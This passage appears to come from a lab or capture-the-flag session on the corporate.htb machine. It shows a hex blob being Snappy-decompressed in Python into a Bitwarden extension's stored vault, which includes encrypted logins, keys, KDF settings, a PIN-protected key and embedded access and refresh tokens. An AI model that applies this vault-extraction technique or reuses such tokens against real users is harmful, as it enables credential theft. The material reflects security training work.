C102D7961686101A6082E696C115871980120146861706F616CA5FF002E719801010160003B5A600011B80E41153D8B15B831080C73686C641EF5090150003C7A50000878696132AF0311B0513808616C69619655D0010101580E952241403E000211380C62656C6B2E680F1158510014736565646F6E759F05010158003E5AB000714018747572626F7461121C1801351158117810696E74756945CA011E09010158003F5A5800159010686F706966792111585110046D793E220016D00900400D580EE8102E0803319008656261055511501EC80A051804617475A832180004626575A0321800046361F5383618000068F530361800006EF528312005780C636F2E6ACDF10E100821C83E200000741A9D3100080DE03E200016161526601631480D60D5D21E98144220000068125715229814422000006D166B231E98144220001ADA131E981442200004747725FD1EB818321801046465229014321800046573228814321800046672228014321800046965227814361800046E001E681436180000740EB0262570321800086E6C001ED013321800087068001E901336180016361541D800412DA03E88037530086563682EC7045188313019202DF14DD800425A58005108107363687761268B0D1558D100092008706C61BDE301B000435A580000091AC01B0C7465736C2E740511B01E680A05200C6D6F746FBD06015800440D58C1C02E880322700912C130147374616E6C65659101E92A18081E703832280008636C690EA625046572A1CD09322168613000140DB01073746F636B01E70063167227B12AF160F198006DBDB501B000450DB001502EB0003160107461786163154E3960D1680920369A0A015800460D583EF81A95C81C6564696177696B691A9F1131601120011B0E380900730D2001A001F05150012045501ADE1111E82E400005640D2121903E4000123C200D400EF00801202E4000007001A40D211EE80B2E20001071756F74650D2091C0517801A010736F7572630D2100082D10514001200C766572730EFC1001831E58192E400010766F7961670D4091C01D200EFD2508617279053F0501217800470D680E400A2ED00151D814616972626E62A1F2090131783A200012CC1A010131783A2000224E1031783E200071C631783E2000893A26881C31D80DA00E0C130E9F0D3578462000006912FA3731784A2000125E103178462000006B05603178462000046E7A21003178462000C97A41E04138462000007612131AD138715015E069C7D53851581920161210D1384E20000E200F1ED01A4A20000C626F0000D5484E200021011ED01A4E200021011ED01A4A200000630160D1604A200004656316182D25204A200000670EB41BD1704A2000E59AD1784E200021E10EF00821804A2000006D01601EA0194E2000E1DA1E28194A2000006E0E822B1EB0184A200000700E52131E50184E20004101001C6D904E200001801EE8174A2000125A081EB0174E20000C760000001E78174A200012B01D1E40174E20000E9A081E10173EA00321FC01011EB8163A20000EFB1005011E78163E200016560900000EA82F25A03A200022101E1EE8153A20000066217C01011EA8153E200041BC01011E78153A200012DC1101011E40153E2000217C01011E08153A20000068615C01011E98143A2000006921DC01011E50143E20000E3C1201011EA0133E2000419C01011E68133A20001E170B00001E30133A2000220614002F4D603A200022F01E1E20123E200061BC01011EC0113A20001ADA090400001E80113E200011C01E50113A200012BC130101003456A00022301F0101C1B800480D2861702EB80651B812A82E00620EB241C9BCD1B84A2000C5BCD1B84A2000C5BCD1B84E2000C1BCD1B84E2000C1BC3E30081DA0A5181E30081E2809322000082E6E7AD1B856200008756B082D10F1F0324000006D26F00C1E580A362000C93C0101D1C05E280051E8D1C85A2800C52C0101D1D05A280055981E100D5A2800A51C01013EE0061DC885643EE0062E200081641EB0214AA80185643EE0061D4085643EE0062E200081643EE0061D20C5A01E60214A800085243EE0061D4085043EE0061D2065C43EE0061D2065843EE0061D2065643EE0062E20001E9422618000494D7041982E800331C028737461636B65786368616E2AD22C26100C31001073757065720EA5351A810C71883248000E091E0C666C6F770D24010171901E200B0EED0C086572660EEE300526719071300E90161547086E65743E90031C61736B7562756E741E8D13719015A801D0086170702A0F0D2508004A2D0801B82E08011EE0090C646F63750E3A2105953D004220001EF11C1AC80E004B0D5800085A682610656E7661742A011E91E03110247468656D65666F726573165B2B01A00EF808912024636F646563616E796F6E097A315011F00E8540046F680EED2B0999315011601C617564696F6A756E0E15300122315031701C67726170686963720EB50C01213E50012070686F746F64756E65011D05E4E9F81EE00F1433646F6365610D9D0D014178004C0D2801D02E700111D810783130686F123C35297231181D200070167037092001010158004D0D5821082E580031101C646E736F6D6174691EC32D115811B0146F70656E646E591E01A0217031E814756D6272656C3223100578004E0D78A1002E78001E7815086361670E524742A132118000151AD00F3C63616E61646173776F6E6465726C616E1E481B118811C80C6361726F0E6C2C11AA01F001A81520106564617266262A2231F83140052008706F691EA43231F811201C646F726E657970611E4A1D31F871D0006B0E902014646F6D696E692E272922980D1EF80C0C6B6E6F7422AD182A682851800C6D6961640E8B361E6B2C1E980D11682C7363686C6974746572626168757D2AD82D11B000760E1339007919F1D1D81E28110EDE49007405B50469733D57D5D8119020776F726C64736F66662AC51E4158004F2DE021882EE0011E6815047562294A31D01E781100751AA81A0101014800505A480011C812381B0C726461701A8225115051A00D2059F58D6800510D5841082EA0001EA009146E6574637570E95C010111583A200000651E180801E84150001751980475730ED1243072636F6E74726F6C70616E656C114E01D800520D80C1D82E800051081079616E6465223617D9401EC838047961163C0A117811980D3800611E980C01E001983A200000621ED80B51E871B00D4000631EEA1851E871281520086D2E610E9B0F51E84A200000670EFC0BE12801804A200012780DA1E801203AA0000065013C010151E03A200012940801011EB8093E20000E9408010151D83A2000006BF1D41EA8093E2000314081A04AA0001EF1392298093A4000006C0E740E01011E98093A2000006D1295112A78103A200022580C1E98093A200022380C1E98093A200004746A015D45ECC9603E200021BC01011E98093A200000750EB40F01011E98093E20003120010141D000530D6841902ED0029E7822716091200EA82271B5016000540D6041D02E600011980EA039086F6E2E163D4E7D309128092026E33301A821D8519809200476702E3405017800550D7801302E78009160087562692AFE3379A81E001804756299D1015000565A50001E4008287472616E7366657277697312D32A3E1801111801E4015000570D5061282EA00071D01474616B65617716D41A0134115011C0206A7573742D6561742E12260C26001F4220001A0A0F218021384220006D729150422000122E0E26C8143178246C6965666572616E646FA91E3E50041D2000612E3009D1802C746875697362657A6F7267640E0A0C3E5004147079737A6E6579500101213800582D3801702E380111981861746C61737369220F19313811201062697462750E5A271A571641202118B1C000740EF6082AA80A313811400EA425087573700EB81600690E64103138112019800E660A39387120086A697222771901D011D81108318020617661746172436F6C165B400D0126D83C16400C10436F6E6669B11312803E51C0127C17006F0E4214000012084011180867697412204101010E2040F1C00950011601012668410875746312DC501E20213698402433393A34382E3536305A11B82A484001490D0126403F011101F811780C746F6B651E5D3D0E403F11481861636365737354011E01330800A30316E8355865794A30655841694F694A4B563151694C434A686247630110F09A53557A49314E694A392E65794A75596D59694F6A45324F4445304D4441304D6A6B73496D5634634349364D5459344D5451774E7A59794F53776961584E7A496A6F696148523063446F764C327876593246736147397A644878736232647062694973496E4E3159694936496A4134596A4D334E5446694C5746685A4455744E4459784E6931694D5759334C5441784E57517A596D55334E446C6B59053C6042795A573170645730694F6E527964575573496D356862575501BD08466248016420424B6232356C63794901ACA87459576C73496A6F695A57783361573475616D39755A584E4159323979634739795958526C4C6D6830596919307058335A6C636D6C6D6157566B496A7030636E566C4C434A76636D647664015C8869493657313073496D39795A32466B62576C75496A70625853776962334A6E64584E6C362400583168626D466E5A5849694F6C74644C434A7A63335268622585C04934597A49795A6A67314F5330774E574E6B4C5451314E4441744F5445314D53316C4E54426C5A44526D4E4446684D546321B1186B5A585A70593205F8146B595759325A218C907930304D7A55324C54526A4D6D51744F44646B4E693032596A526B597A6B784E5455794D5425F13C7A593239775A53493657794A6863476B01544C765A6D5A736157356C5832466A5932567A63794A01AC04686205B8F4F20173695158427762476C6A59585270623234695858302E5367594A4D6F69426E755668464D53456C4A30504A647A633731697644384B64586A75596541434E6F69626B45695954626D6771754C67597A6A3569337559704A4B573851347A70544C6468376B6663583838785143524730554B365470515844324B694E3349765445736D676A4F444C6F7A56505F5452454C424377336866674F75696167636F65717A465146486E5A397052573233454B6A4356597449533471743645516A497A2D7A496A4F6C6E4F7A53653352424432394944344D5137377246556E545F733074354F4A70717A4162476C692D7A72747370737A305F68526C697975767079464A4A525431516C332D664638707235555F6955317473542D317568435933744F5F31626C576B3831776B6B6A5A5837354267415839596D4E6B5174475231314E6B5F67313653565953786930516B7242513043466451694B6250744F47685775633734375A644D62665759567700000000000C0000800400FFFF72656672657368546F6B656E00000000580000800400FFFF45745A4F5742584D78385746756350784E5567352D576D2D7571434B2D356835556A62303741543436686A363470317953784D4F62306775734E755F314E75363550474E545965324853335557796E6B546E327335673D3D000000001300FFFF090089301067726F75700EC40D85460901816800101EF00B22285600430EC7270D27B9681668522E1C00010104FFFFD530087970653E1E000E5044D1E81E885700432AD858A1781120086E6F461222583E2000B1B02E105901381118099809AF01180196A1581EB0450ED8520114010101F07EB0001EA00C01380956C9380140015811782E900001581120D1E001401E99472E20001C000000001300FFFF')
>>> snappy.decompress(data)
b'\x03\x00\x00\x00\x00\x00\xf1\xff\x00\x00\x00\x00\x08\x00\xff\xff\x04\x00\x00\x80\x04\x00\xff\xffdata\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffciphers\x00\x00\x00\x00\x00\x08\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffencrypted\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff$\x00\x00\x80\x04\x00\xff\xff5534f6a7-180f-40e0-bf08-ec1757651ddf\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\x02\x00\x00\x80\x04\x00\xff\xffid\x00\x00\x00\x00\x00\x00$\x00\x00\x80\x04\x00\xff\xff5534f6a7-180f-40e0-bf08-ec1757651ddf\x00\x00\x00\x00\x0e\x00\x00\x80\x04\x00\xff\xfforganizationId\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xfffolderId\x00\x00\x00\x00\x00\x00\xff\xff\x04\x00\x00\x80\x04\x00\xff\xffedit\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffviewPassword\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\xff\xff\x13\x00\x00\x80\x04\x00\xff\xfforganizationUseTotp\x00\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xfffavorite\x00\x00\x00\x00\x02\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffrevisionDate\x00\x00\x00\x00\x1b\x00\x00\x80\x04\x00\xff\xff2023-04-13T14:49:46.357979Z\x00\x00\x00\x00\x00\x04\x00\x00\x80\x04\x00\xff\xfftype\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x04\x00\x00\x80\x04\x00\xff\xffname\x00\x00\x00\x00`\x00\x00\x80\x04\x00\xff\xff2.QRF9vICQrDeH9/p7O0wDGg==|gNJPx5FdIf9wsfry7G/AaA==|Kb04guj5gnFQedVEU/WxYS5DDPHGEIu2+ZXg1UUNzAs=\x05\x00\x00\x80\x04\x00\xff\xffnotes\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffcollectionIds\x00\x00\x00\x00\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffcreationDate\x00\x00\x00\x00\x1b\x00\x00\x80\x04\x00\xff\xff2023-04-13T14:49:46.357808Z\x00\x00\x00\x00\x00\x0b\x00\x00\x80\x04\x00\xff\xffdeletedDate\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffreprompt\x00\x00\x00\x00\x03\x00\xff\xff\x05\x00\x00\x80\x04\x00\xff\xfflogin\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffusername`\x00\x00\x80\x04\x00\xff\xff2.V2ahDugC17hDcs1DXTuSIQ==|hjbtch5fmSrnQy0E5Db8WQ==|U0PYls4Yc5nS4Jj/4Ww62NwUHJVTWOfsN/Y4RYAqOHM=\x08\x00\x00\x80\x04\x00\xff\xffpasswordt\x00\x00\x80\x04\x00\xff\xff2.Iph36qmComaiswLb14WlAA==|PIKCpZUjUahxIZDY85A3lG3IJvuwNK7ijLPI0bOs9wo=|exw4ejWgj+J4JMvVeVNRZAAEl+AEBa9v3t2FsAbrK50=\x00\x00\x00\x00\x14\x00\x00\x80\x04\x00\xff\xffpasswordRevisionDate\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x04\x00\x00\x80\x04\x00\xff\xfftotp\x00\x00\x00\x00\xb4\x00\x00\x80\x04\x00\xff\xff2.loUutWoUP7wBxDuXlP/5EQ==|sS9VUekU4p9uehvbk7jghpnq48nwhXSD06A5ULGLsH6law/QKfiXMmYyy8681cIWSWR7PGKu/UpUOI54axRdbOj9idVHYI8jG2xAZ/7jgqc=|vNZ3Z9EXE7/Bx0G7Ahc3v66f79sloFCpQWiQJv9hNb4=\x00\x00\x00\x00\x12\x00\x00\x80\x04\x00\xff\xffautofillOnPageLoad\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x04\x00\x00\x80\x04\x00\xff\xffuris\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x00\x00\x00\x00\x08\x00\xff\xff\x05\x00\x00\x80\x04\x00\xff\xffmatch\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x03\x00\x00\x80\x04\x00\xff\xffuri\x00\x00\x00\x00\x00t\x00\x00\x80\x04\x00\xff\xff2.FlCTBaXbxdmpbeOkc6sVVQ==|7HKSX/80AsZ3khkAPGu6KL9FrrS1St2CgsgxpbAb5g4=|A9F8Vmxv4NlNKrBkUll24ms78gA9wRKMyc3cVvIgHSo=\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xfffolders\x00\x00\x00\x00\x00\x08\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffencrypted\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x05\x00\x00\x80\x04\x00\xff\xffsends\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffencrypted\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffcollections\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffencrypted\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffpolicies\x00\x00\x00\x00\x08\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffencrypted\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x19\x00\x00\x80\x04\x00\xff\xffpasswordGenerationHistory\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xfforganizations\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffproviders\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x04\x00\x00\x80\x04\x00\xff\xffkeys\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\x12\x00\x00\x80\x04\x00\xff\xffcryptoSymmetricKey\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffencrypted\x00\x00\x00\x00\x00\x00\x00\xb4\x00\x00\x80\x04\x00\xff\xff2.P1Lqt0Sx1R2CQtRNkMf5fg==|eCoKK3rLOFDr+hkEMnMXt0JVcHqPXCujrGVis+Gyw1Fr1E3gSc/vmmh7/Gvxq5Xtrm8w1QgwS1/IPQGExeoxfzPgCaT5E7hi3a9b69a6VAY=|65ddumi7WswgT0YFyjZ+pAhjvbD08a+Fv15v4rO4Pgc=\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x10\x00\x00\x80\x04\x00\xff\xfforganizationKeys\x00\x00\x00\x00\x08\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffencrypted\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffproviderKeys\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffencrypted\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xffprivateKey\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffencrypted\x00\x00\x00\x00\x00\x00\x00\xb4\x06\x00\x80\x04\x00\xff\xff2.xdMY27MhP2jRmuDO/Rjdxw==|PuTCjfj60eX5fQ84uMY5m62tI/4g8Jd85EdO/1YeFRYN6hwKSseVJ3xbQ91NL1NfXlF23O6itFsiooctE2Uu0qzqtqzKk0Gt3LxjNeXsg0wI7YHsiPEc8VIjnAiZ4aKftOKLa+NCkcFNJMnErq6vADHedIHyTbiu2xq45pGu0rNXzi59bPnOywunwmZW20TqYNXaIf9+sWo3HvfeARJLf4p59zPZD2S41Gmouu0ecKVBrIXM3e4f+gcYRhCqV82EjurnAhrQOt2KiXQt3u9Nl/zD8KdSuGzlVxoc9ODY7PIAVzVPjaBTJDeoTq/zX66zz5q091RNI8KVMgj7kLf03KpQ9PjnlZc2JeYOQ4yWopLZ381t1WOGgeS/i3Ib40ekE5SDIk33GjPtM7+cT1HF32YlbYI9mwEHWTn4yMP5MDkVS8+EjZu7ZOvTci7v/7N0x2CoK04/B6vYnEgZDBWhp5t3ffzLEu7W98C4p+qKFUF4xm+q7HEFpf9UVTXLbbmYRMVW2uWh0ngAGCg3YpeYn3Vkyv5NmHxg0+h2PYvf1o9jeIaT5QURnr2WbJbdsusX92l3wJ1fQ95a/+zROBacZ1mNL3Qzov/blQJocAQ802mIIEoQe0XnhF3DBnY7PnoVZT1bgx2kaDVFLlMACodMvFa45Nz91NB4DNejzq0Myu4VMXLw0sf0WdNZ4EEkBTUnVDQSf/5szarmW4HgEakX9IAszPUMYGJKaqQ9bf5Pisap9jZOeNF20BcpzxYNVTEZeQ7WODmSO4fstbHD5bsJrR8sPcU21ekeNFjIhl9C72CCWDevGOFItwLJp55dX1//pXDdgRIZx/D+zar5XX+Av3AgOEyFB65UdNnQePI7UFd43a+kmAD4n8dXJkal2GbhBez8j98Q4N08GdjGM9cabXgEVnigePrg37k8YrhBCLmSjOz40HhYT6kyn1gs4NJU0ofD6e4Dl9Ql/r79IBqceMuln2cUL9kBYhRSRS8vF6iubVuVh1amCNCP1kIunn+2ZW6OPWlDjVczebsexiWg1tgCekVxLEpsERo+h0dq39u7GL9Hv0l4n77IdRMs9lBwq4Djjh6vRO+4eqLwLLxr5DX3Qb9yM/beonnMVEOvr8CpporYruUyMmwl9OYCBpLwhcPiP2Wt4uEUHvkRnZvYU+xKtQ2IH86ij4ukGQNuPiJEzvv7Z23av3Zwr1iwLVUSw8CTYPdjNw8yuqMEZkMLwnIU2JXU53GrXboFNGUwjlEQGj7l1Po4hG0u5VFrHQAizU0MaVCxDI9XJHBVisYDuSTSGsTI+4s74rcfxXfmdekn1jSbXoCx0hY3/U7ZgyTv6pIdF1U5OEVD4uDL1Kqx2a81nK6QDwv/cnxTCRVK2aoFuWqgt57bSc3BM/GVwuPsoMtodz3WvqOelMPMYkvjQD0mDP1At6/VfMfR0NPN0evtbAXORdxzOWhfI/TDuOPj2SLX6I8ja7djRy0ySi1sc9STtbSCeSjMMD9oh/IctAj7Tx5X8Uf5qJYBqDjXYh9oCYPeYkJLd5k7kcZoulvtdnPpYXNdzFfRtwQwd2as2CSIKw+FGSPjBKz6MdKmhKZINNT0vYjggR85U76Hb3PcwrseNHa+OBhYP4yqgcKQZ5A=|7JgQdibBxbz40xNTJJHWe4V8LNr9Ezz6qE/Raz4oOgo=\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x0f\x00\x00\x80\x04\x00\xff\xffcryptoMasterKey\x00\x00\x00\x00\x00\x00\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffpublicKey\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffprofile\x00\x00\x00\x00\x00\x08\x00\xff\xff\x06\x00\x00\x80\x04\x00\xff\xffuserId\x00\x00$\x00\x00\x80\x04\x00\xff\xff08b3751b-aad5-4616-b1f7-015d3be749db\x00\x00\x00\x00\x04\x00\x00\x80\x04\x00\xff\xffname\x00\x00\x00\x00\x0b\x00\x00\x80\x04\x00\xff\xffElwin Jones\x00\x00\x00\x00\x00\x05\x00\x00\x80\x04\x00\xff\xffemail\x00\x00\x00\x19\x00\x00\x80\x04\x00\xff\xffelwin.jones@corporate.htb\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x80\x04\x00\xff\xffhasPremiumPersonally\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffkdfIterations\x00\x00\x00\xc0\'\t\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffkdfMemory\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xffkdfParallelism\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffkdfType\x00\x00\x00\x00\x00\x03\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffkeyHash\x00,\x00\x00\x80\x04\x00\xff\xff74E71oPZI9vNnoESNkuLlaDTlk1zA/cH5l5XNOLOc4w=\x00\x00\x00\x00\r\x00\x00\x80\x04\x00\xff\xffemailVerified\x00\x00\x00\x01\x00\x00\x00\x02\x00\xff\xff\x10\x00\x00\x80\x04\x00\xff\xffusesKeyConnector\x00\x00\x00\x00\x02\x00\xff\xff\x1c\x00\x00\x80\x04\x00\xff\xffconvertAccountToKeyConnector\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xfflastSync\x18\x00\x00\x80\x04\x00\xff\xff2023-04-13T15:40:27.533Z\x1a\x00\x00\x80\x04\x00\xff\xffhasPremiumFromOrganization\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffsettings\x00\x00\x00\x00\x08\x00\xff\xff\x0f\x00\x00\x80\x04\x00\xff\xffenvironmentUrls\x00\x00\x00\x00\x00\x08\x00\xff\xff\x04\x00\x00\x80\x04\x00\xff\xffbase\x00\x00\x00\x001\x00\x00\x80\x04\x00\xff\xffhttp://passwordtestingserver-corporate.local:8000\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x80\x04\x00\xff\xffapi\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffidentity\x00\x00\x00\x00\x00\x00\xff\xff\x05\x00\x00\x80\x04\x00\xff\xfficons\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffnotifications\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x06\x00\x00\x80\x04\x00\xff\xffevents\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffwebVault\x00\x00\x00\x00\x00\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffkeyConnector\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\x00\x00\x00\x13\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffpinProtected\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffencrypted\x00\x00\x00\x00\x00\x00\x00\x88\x00\x00\x00\x04\x00\xff\xff2\x00.\x00D\x00X\x00G\x00d\x00S\x00a\x00N\x008\x00t\x00L\x00q\x005\x00t\x00S\x00Y\x00X\x001\x00J\x000\x00Z\x00D\x00g\x00=\x00=\x00|\x004\x00u\x00X\x00L\x00m\x00R\x00N\x00p\x00/\x00d\x00J\x00g\x00E\x004\x001\x00M\x00Y\x00V\x00x\x00q\x00+\x00n\x00v\x00d\x00a\x00u\x00i\x00n\x00u\x000\x00Y\x00K\x002\x00e\x00K\x00o\x00M\x00v\x00A\x00E\x00m\x00v\x00J\x008\x00A\x00J\x009\x00D\x00b\x00e\x00x\x00e\x00w\x00r\x00g\x00h\x00X\x00w\x00l\x00B\x00v\x009\x00p\x00R\x00|\x00U\x00c\x00B\x00z\x00i\x00S\x00Y\x00u\x00C\x00i\x00J\x00p\x00p\x005\x00M\x00O\x00R\x00B\x00g\x00H\x00v\x00R\x002\x00m\x00V\x00g\x00x\x003\x00i\x00l\x00p\x00Q\x00h\x00N\x00t\x00z\x00N\x00J\x00A\x00z\x00f\x004\x00M\x00=\x00\x00\x00\x00\x00\x13\x00\xff\xff\x12\x00\x00\x80\x04\x00\xff\xffvaultTimeoutAction\x00\x00\x00\x00\x00\x00\x04\x00\x00\x80\x04\x00\xff\xfflock\x00\x00\x00\x00\x0c\x00\x00\x80\x04\x00\xff\xffvaultTimeout\x00\x00\x00\x00\xff\xff\xff\xff\x03\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffprotectedPin\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffsettings\x00\x00\x00\x00\x08\x00\xff\xff\x11\x00\x00\x80\x04\x00\xff\xffequivalentDomains\x00\x00\x00\x00\x00\x00\x00Y\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xffameritrade.com\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x10\x00\x00\x80\x04\x00\xff\xfftdameritrade.com\x00\x00\x00\x00\x13\x00\xff\xff\x01\x00\x00\x00\x03\x00\xff\xff\x04\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x11\x00\x00\x80\x04\x00\xff\xffbankofamerica.com\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffbofa.com\x02\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffmbna.com\x03\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xffusecfo.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x02\x00\x00\x00\x03\x00\xff\xff\x03\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xffsprint.com\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffsprintpcs.com\x00\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xffnextel.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x03\x00\x00\x00\x03\x00\xff\xff\x03\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffyoutube.com\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xffgoogle.com\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffgmail.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x04\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffapple.com\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xfficloud.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x05\x00\x00\x00\x03\x00\xff\xff\x03\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xffwellsfargo.com\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x06\x00\x00\x80\x04\x00\xff\xffwf.com\x00\x00\x02\x00\x00\x0